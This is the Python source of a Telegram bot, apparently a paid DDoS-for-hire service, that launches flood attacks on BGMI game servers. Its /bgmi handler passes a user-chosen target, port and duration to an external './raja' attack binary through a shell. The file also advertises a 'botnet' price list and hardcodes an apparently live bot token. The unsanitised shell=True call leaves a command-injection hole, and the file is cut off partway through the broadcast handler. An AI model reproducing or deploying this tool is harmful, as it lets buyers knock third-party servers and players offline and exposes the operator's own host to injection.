#script by @RAJARAJ909

import telebot
import subprocess
import datetime
import os

from keep_alive import keep_alive
keep_alive()
# insert your Telegram bot token here
bot = telebot.TeleBot('7719479194:AAEq2pbWgs2GwIEd-8TDwEvq0vk_IflAKmU')

# Admin user IDs
admin_id = ["7681062358"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    admin_id = ["4588464356"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "𝗟𝗼𝗴𝘀 𝗮𝗿𝗲 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗰𝗹𝗲𝗮𝗿𝗲𝗱. 𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌."
            else:
                file.truncate(0)
                response = "𝗟𝗼𝗴𝘀 𝗰𝗹𝗲𝗮𝗿𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅"
    except FileNotFoundError:
        response = "𝗡𝗼 𝗹𝗼𝗴𝘀 𝗳𝗼𝘂𝗻𝗱 𝘁𝗼 𝗰𝗹𝗲𝗮𝗿."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "𝗘𝘅𝗽𝗶𝗿𝗲𝗱"
        else:
            return str(remaining_time)
    else:
        return "𝗡/𝗔"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗳𝗼𝗿𝗺𝗮𝘁. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝗽𝗼𝘀𝗶𝘁𝗶𝘃𝗲 𝗶𝗻𝘁𝗲𝗴𝗲𝗿 𝗳𝗼𝗹𝗹𝗼𝘄𝗲𝗱 𝗯𝘆 '𝗵𝗼𝘂𝗿(𝘀)', '𝗱𝗮𝘆(𝘀)', '𝘄𝗲𝗲𝗸(𝘀)', 𝗼𝗿 '𝗺𝗼𝗻𝘁𝗵(𝘀)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"𝗨𝘀𝗲𝗿 {user_to_add} 𝗮𝗱𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗳𝗼𝗿 {duration} {time_unit}. 𝗔𝗰𝗰𝗲𝘀𝘀 𝘄𝗶𝗹𝗹 𝗲𝘅𝗽𝗶𝗿𝗲 𝗼𝗻 {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝘀𝗲𝘁 𝗮𝗽𝗽𝗿𝗼𝘃𝗮𝗹 𝗲𝘅𝗽𝗶𝗿𝘆 𝗱𝗮𝘁𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿."
            else:
                response = "𝗨𝘀𝗲𝗿 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗲𝘅𝗶𝘀𝘁𝘀 🤦‍♂️."
        else:
            response = "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗽𝗲𝗰𝗶𝗳𝘆 𝗮 𝘂𝘀𝗲𝗿 𝗜𝗗 𝗮𝗻𝗱 𝘁𝗵𝗲 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 (𝗲.𝗴., 𝟭𝗵𝗼𝘂𝗿, 𝟮𝗱𝗮𝘆𝘀, 𝟯𝘄𝗲𝗲𝗸𝘀, 𝟰𝗺𝗼𝗻𝘁𝗵𝘀) 𝘁𝗼 𝗮𝗱𝗱 😘."
    else:
        response = "𝗧𝘂𝗺𝗵𝗮𝗿𝗲 𝗽𝗮𝘀 𝗮𝗯𝗵𝗶 𝘁𝗮𝗸 𝗸𝘂𝗰𝗵 𝗸𝗵𝗿𝗶𝗱𝗮 𝗻𝗮𝗵𝗶 𝗵𝗮𝗶, 𝗮𝗯𝗵𝗶 𝗸𝗵𝗿𝗶𝗱𝗼:- @RAJARAJ909."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "𝗡/𝗔"
    user_role = "𝗔𝗱𝗺𝗶𝗻" if user_id in admin_id else "𝗨𝘀𝗲𝗿"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 𝗬𝗼𝘂𝗿 𝗜𝗻𝗳𝗼:\n\n🆔 𝗨𝘀𝗲𝗿 𝗜𝗗: <code>{user_id}</code>\n📝 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {username}\n🔖 𝗥𝗼𝗹𝗲: {user_role}\n📅 𝗔𝗽𝗽𝗿𝗼𝘃𝗮𝗹 𝗘𝘅𝗽𝗶𝗿𝘆 𝗗𝗮𝘁𝗲: {user_approval_expiry.get(user_id, '𝗡𝗼𝘁 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱')}\n⏳ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝗔𝗽𝗽𝗿𝗼𝘃𝗮𝗹 𝗧𝗶𝗺𝗲: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")


@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝗨𝘀𝗲𝗿 {user_to_remove} 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 👍."
            else:
                response = f"𝗨𝘀𝗲𝗿 {user_to_remove} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝗹𝗶𝘀𝘁 ❌."
        else:
            response = '''𝗣𝗹𝗲𝗮𝘀𝗲 𝗦𝗽𝗲𝗰𝗶𝗳𝘆 𝗔 𝗨𝘀𝗲𝗿 𝗜𝗗 𝘁𝗼 𝗥𝗲𝗺𝗼𝘃𝗲. 
✅ 𝗨𝘀𝗮𝗴𝗲: /remove <userid>'''
    else:
        response = "𝗧𝘂𝗺𝗵𝗮𝗿𝗲 𝗽𝗮𝘀 𝗮𝗯𝗵𝗶 𝘁𝗮𝗸 𝗸𝘂𝗰𝗵 𝗸𝗵𝗿𝗶𝗱𝗮 𝗻𝗮𝗵𝗶 𝗵𝗮𝗶, 𝗮𝗯𝗵𝗶 𝗸𝗵𝗿𝗶𝗱𝗼:- @RAJARAJ909 🙇."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝗟𝗼𝗴𝘀 𝗮𝗿𝗲 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗰𝗹𝗲𝗮𝗿𝗲𝗱. 𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌."
                else:
                    file.truncate(0)
                    response = "𝗟𝗼𝗴𝘀 𝗖𝗹𝗲𝗮𝗿𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅"
        except FileNotFoundError:
            response = "𝗟𝗼𝗴𝘀 𝗮𝗿𝗲 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗰𝗹𝗲𝗮𝗿𝗲𝗱 ❌."
    else:
        response = "𝗧𝘂𝗺𝗵𝗮𝗿𝗲 𝗽𝗮𝘀 𝗮𝗯𝗵𝗶 𝘁𝗮𝗸 𝗸𝘂𝗰𝗵 𝗸𝗵𝗿𝗶𝗱𝗮 𝗻𝗮𝗵𝗶 𝗵𝗮𝗶, 𝗮𝗯𝗵𝗶 𝗸𝗵𝗿𝗶𝗱𝗼:- @RAJARAJ909 ❄."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "𝗨𝗦𝗘𝗥𝗦 𝗮𝗿𝗲 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗰𝗹𝗲𝗮𝗿𝗲𝗱. 𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌."
                else:
                    file.truncate(0)
                    response = "𝗨𝘀𝗲𝗿𝘀 𝗖𝗹𝗲𝗮𝗿𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 ✅"
        except FileNotFoundError:
            response = "𝗨𝘀𝗲𝗿𝘀 𝗮𝗿𝗲 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗰𝗹𝗲𝗮𝗿𝗲𝗱 ❌."
    else:
        response = "𝗙𝗿𝗲𝗲 𝗸𝗮 𝗱𝗵𝗮𝗿𝗺 𝗵𝗮𝗶 𝗸𝘆𝗮 𝗯𝗮𝗯𝘂𝗮? 𝗞𝗵𝗮𝗿𝗶𝗱𝗼 𝗻𝗮𝗵𝗶 𝘁𝗼 𝗰𝗵𝗮𝗹𝗮𝗼 𝗺𝗮𝘁, 𝗸𝗵𝗮𝗿𝗶𝗱𝗼:- @RAJARAJ909 🙇."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗨𝘀𝗲𝗿𝘀:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (𝗜𝗗: {user_id})\n"
                        except Exception as e:
                            response += f"- 𝗨𝘀𝗲𝗿 𝗜𝗗: {user_id}\n"
                else:
                    response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌"
        except FileNotFoundError:
            response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌"
    else:
        response = "𝗙𝗿𝗲𝗲 𝗸𝗮 𝗱𝗵𝗮𝗿𝗺 𝗵𝗮𝗶 𝗸𝘆𝗮 𝗯𝗮𝗯𝘂𝗮? 𝗞𝗵𝗮𝗿𝗶𝗱𝗼 𝗻𝗮𝗵𝗶 𝘁𝗼 𝗰𝗵𝗮𝗹𝗮𝗼 𝗺𝗮𝘁, 𝗸𝗵𝗮𝗿𝗶𝗱𝗼:- @RAJARAJ909 ❄."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌."
                bot.reply_to(message, response)
        else:
            response = "𝗡𝗼 𝗱𝗮𝘁𝗮 𝗳𝗼𝘂𝗻𝗱 ❌"
            bot.reply_to(message, response)
    else:
        response = "𝗙𝗿𝗲𝗲 𝗸𝗮 𝗱𝗵𝗮𝗿𝗺 𝗵𝗮𝗶 𝗸𝘆𝗮 𝗯𝗮𝗯𝘂𝗮? 𝗞𝗵𝗮𝗿𝗶𝗱𝗼 𝗻𝗮𝗵𝗶 𝘁𝗼 𝗰𝗵𝗮𝗹𝗮𝗼 𝗺𝗮𝘁, 𝗸𝗵𝗮𝗿𝗶𝗱𝗼:- @RAJARAJ909 ❄."
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🔥🔥 {username}, 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗛𝗨𝗥𝗨 𝗛𝗢 𝗚𝗔𝗬𝗢 𝗕𝗔𝗕𝗨𝗔! 🔥🔥\n\n🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}\n🚪 𝗣𝗼𝗿𝘁: {port}\n⏱ 𝗧𝗶𝗺𝗲: {time} 𝗦𝗲𝗰𝗼𝗻𝗱\n💥 𝗠𝗲𝘁𝗵𝗼𝗱: 𝗩𝗜𝗣- 𝗨𝘀𝗲𝗿 𝗼𝗳 @RAJARAJ909"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝗧𝘂𝗺 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗺𝗲 𝗵𝗼 𝗯𝗮𝗯𝘂𝗮 ❌. 𝟭𝟬 𝘀𝗲𝗰𝗼𝗻𝗱 𝗿𝘂𝗸𝗼 𝗳𝗶𝗿 /bgmi 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗰𝗵𝗮𝗹𝗮𝗼."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 120:
                response = "𝗚𝗮𝗹𝗯𝗮𝘁: 𝗧𝗶𝗺𝗲 𝟲𝟬𝟬 𝘀𝗲𝗰𝗼𝗻𝗱 𝘀𝗲 𝗸𝗮𝗺 𝗵𝗼𝗻𝗮 𝗰𝗵𝗮𝗵𝗶𝘆𝗲."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./raja {target} {port} {time} 500"
                process = subprocess.run(full_command, shell=True)
                response = f"𝗕𝗚𝗠𝗜 𝗮𝘁𝘁𝗮𝗰𝗸 𝗽𝘂𝗿𝗮 𝗵𝗼 𝗴𝗮𝘆𝗮 𝗯𝗮𝗯𝘂𝗮! 🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target} 🚪 𝗣𝗼𝗿𝘁: {port} ⏱ 𝗧𝗶𝗺𝗲: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ 𝗨𝘀𝗮𝗴𝗲 :- /bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = ("🚫 𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! 🚫\n\n𝗢𝗵𝗼 𝗯𝗮𝗯𝘂𝗮! 𝗧𝘂𝗺𝗵𝗮𝗿𝗲 𝗽𝗮𝘀 /bgmi 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗰𝗵𝗮𝗹𝗮𝗻𝗲 𝗸𝗮 𝗮𝗱𝗵𝗶𝗸𝗮𝗿 𝗻𝗮𝗵𝗶 𝗵𝗮𝗶. 𝗞𝗵𝗮𝗿𝗶𝗱𝗻𝗲 𝗸𝗲 𝗹𝗶𝘆𝗲 𝗗𝗠 𝗸𝗮𝗿𝗼:- @RAJARAJ909")

    bot.reply_to(message, response)


# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "𝗧𝘂𝗺𝗵𝗮𝗿𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗟𝗼𝗴𝘀:\n" + "".join(user_logs)
                else:
                    response = "❌ 𝗧𝘂𝗺𝗵𝗮𝗿𝗲 𝗹𝗶𝘆𝗲 𝗸𝗼𝗶 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗹𝗼𝗴𝘀 𝗻𝗮𝗵𝗶 𝗺𝗶𝗹𝗲 ❌."
        except FileNotFoundError:
            response = "𝗞𝗼𝗶 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗹𝗼𝗴𝘀 𝗻𝗮𝗵𝗶 𝗺𝗶𝗹𝗲."
    else:
        response = "𝗧𝘂𝗺𝗵𝗮𝗿𝗲 𝗽𝗮𝘀 𝘆𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗰𝗵𝗮𝗹𝗮𝗻𝗲 𝗸𝗮 𝗮𝗱𝗵𝗶𝗸𝗮𝗿 𝗻𝗮𝗵𝗶 𝗵𝗮𝗶 😡."

    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 𝗨𝗽𝗹𝗮𝗯𝗱𝗵 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀:
💥 /bgmi : 𝗕𝗚𝗠𝗜 𝘀𝗲𝗿𝘃𝗲𝗿𝘀 𝗸𝗲 𝗹𝗶𝘆𝗲 𝗺𝗲𝘁𝗵𝗼𝗱. 
💥 /rules : 𝗜𝘀𝘁𝗲𝗺𝗮𝗹 𝘀𝗲 𝗽𝗵𝗹𝗲 𝗱𝗲𝗸𝗵 𝗹𝗼!.
💥 /mylogs : 𝗔𝗽𝗻𝗲 𝗵𝗮𝗹 𝗸𝗲 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 𝗱𝗲𝗸𝗵𝗻𝗲 𝗸𝗲 𝗹𝗶𝘆𝗲.
💥 /plan : 𝗛𝗮𝗺𝗮𝗿𝗲 𝗯𝗼𝘁𝗻𝗲𝘁 𝗸𝗲 𝗿𝗮𝘁𝗲𝘀 𝗱𝗲𝗸𝗵𝗼.
💥 /myinfo : 𝗔𝗽𝗻𝗶 𝘀𝗮𝗿𝗶 𝗷𝗮𝗻𝗸𝗮𝗿𝗶 𝗱𝗲𝗸𝗵𝗻𝗲 𝗸𝗲 𝗹𝗶𝘆𝗲.

🤖 𝗔𝗱𝗺𝗶𝗻 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗱𝗲𝗸𝗵𝗻𝗲 𝗸𝗲 𝗹𝗶𝘆𝗲:
💥 /admincmd : 𝗦𝗮𝗿𝗲 𝗮𝗱𝗺𝗶𝗻 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀 𝗱𝗶𝗸𝗵𝗮𝘁𝗮 𝗵𝗮𝗶.

𝗞𝗵𝗮𝗿𝗶𝗱𝗻𝗲 𝗸𝗲 𝗹𝗶𝘆𝗲 :- @RAJARAJ909
𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 :- https://t.me/+5kOqdATVb7pkMDY1
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''❄️𝗦𝘄𝗮𝗴𝗮𝘁 𝗵𝗮𝗶 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝗗𝗗𝗼𝘀 𝗯𝗼𝘁 𝗺𝗲, {user_name}! 𝗬𝗲 𝗵𝗮𝗶 𝗯𝗵𝗮𝗶𝘀𝗮𝗯 𝘀𝗲𝗿𝘃𝗲𝗿 𝗯𝗮𝘀𝗲𝗱 𝗗𝗗𝗼𝘀. 𝗔𝗰𝗰𝗲𝘀𝘀 𝗽𝗮𝗻𝗲 𝗸𝗲 𝗹𝗶𝘆𝗲.
🤖𝗜𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗰𝗵𝗮𝗹𝗮𝗼 : /help 
✅𝗞𝗛𝗔𝗥𝗜𝗗𝗢 :- @RAJARAJ909'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝗬𝗲 𝗻𝗶𝘆𝗮𝗺 𝗽𝗮𝗹𝗮𝗻 𝗸𝗮𝗿𝗼 ⚠️:

1. 𝗕𝗵𝗼𝘁 𝘀𝗮𝗿𝗲 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 𝗺𝗮𝗹𝗶 𝗺𝗮𝘁 𝗸𝗮𝗿𝗻𝗮, 𝗻𝗮𝗵𝗶 𝘁𝗼 𝗯𝗮𝗻 𝗵𝗼 𝗷𝗮𝗼𝗴𝗲!
2. 𝗘𝗸 𝘀𝗮𝘁𝗵 𝗱𝗼 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 𝗺𝗮𝘁 𝗰𝗵𝗮𝗹𝗮𝗼, 𝗻𝗮𝗵𝗶 𝘁𝗼 𝗯𝗮𝗻 𝗵𝗼 𝗷𝗮𝗼𝗴𝗲.
3. 𝗖𝗮𝗿𝗻𝗮 𝗸𝗮𝗰𝗵 𝗸𝗮𝗺 𝗻𝗮𝗵𝗶 𝗸𝗮𝗿𝗲𝗴𝗮
4. 𝗛𝗮𝗺 𝗿𝗼𝗷 𝗹𝗼𝗴𝘀 𝗰𝗵𝗲𝗰𝗸 𝗸𝗮𝗿𝘁𝗲 𝗵𝗮𝗶, 𝗶𝘀𝗹𝗶𝘆𝗲 𝗻𝗶𝘆𝗮𝗺 𝗽𝗮𝗹𝗮𝗻 𝗸𝗮𝗿𝗼!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝗕𝗵𝗮𝗶 𝗲𝗸 𝗵𝗶 𝗽𝗹𝗮𝗻 𝗵𝗮𝗶 𝗷𝗼 𝘀𝗮𝗯𝘀𝗲 𝘁𝗮𝗸𝗮𝘁𝘃𝗮𝗿 𝗵𝗮𝗶:

𝗩𝗶𝗽 🌟 :
-> 𝗔𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 : 𝟯𝟬𝟬 (𝗦)
> 𝗔𝘁𝘁𝗮𝗰𝗸 𝗸𝗲 𝗯𝗮𝗮𝗱 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 : 𝟭𝟬 𝘀𝗲𝗰
-> 𝗘𝗸 𝘀𝗮𝘁𝗵 𝗮𝗶𝘁𝗻𝗲 𝗮𝘁𝘁𝗮𝗰𝗸𝘀 : 𝟱

𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁💸 :
𝗗𝗮𝘆-->𝟴𝟬 𝗥𝘀
𝗪𝗲𝗲𝗸-->𝟰𝟬𝟬 𝗥𝘀
𝗠𝗼𝗻𝘁𝗵-->𝟭𝟬𝟬𝟬 𝗥𝘀
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝗬𝗲 𝗿𝗮𝗵𝗲 𝗮𝗱𝗺𝗶𝗻 𝗸𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀:

💥 /add <userId> : 𝗨𝘀𝗲𝗿 𝗸𝗼 𝗮𝗱𝗱 𝗸𝗮𝗿𝗼.
💥 /remove <userid> 𝗨𝘀𝗲𝗿 𝗸𝗼 𝗵𝗮𝘁𝗮𝗼.
💥 /allusers : 𝗦𝗮𝗿𝗲 𝗮𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗱𝗶𝗸𝗵𝗮𝗼.
💥 /logs : 𝗦𝗮𝗿𝗲 𝘂𝘀𝗲𝗿𝘀 𝗸𝗲 𝗹𝗼𝗴𝘀.
💥 /broadcast : 𝗦𝗮𝗯𝗸𝗼 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗯𝗵𝗲𝗷𝗼.
💥 /clearlogs : 𝗟𝗼𝗴𝘀 𝗳𝗮𝗶𝗹 𝗸𝗼 𝗰𝗹𝗲𝗮𝗿 𝗸𝗮𝗿𝗼.
💥 /clearusers : 𝗨𝘀𝗲𝗿𝘀 𝗳𝗮𝗶𝗹 𝗸𝗼 𝗰𝗹𝗲𝗮𝗿 𝗸𝗮𝗿𝗼.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ 𝗔𝗱𝗺𝗶𝗻 𝘀𝗲 𝘀𝗮𝗯 𝘂𝘀𝗲𝗿𝘀 𝗸𝗼 𝗺𝗲𝘀𝘀𝗮𝗴𝗲:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "𝗦𝗮𝗯 𝘂𝘀𝗲𝗿𝘀 𝗸𝗼 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝗯𝗵𝗲𝗷 𝗱𝗶𝘆𝗮 𝗴𝗮𝘆𝗮 👍."
        else:
            response = "🤖 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝗸𝗮𝗿𝗻𝗲 𝗸𝗲 𝗹𝗶𝘆𝗲 𝗸𝗼𝗶 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝘁𝗼 𝗱𝗲𝗻𝗮 𝗽𝗮𝗱𝗲𝗴𝗮."
    else:
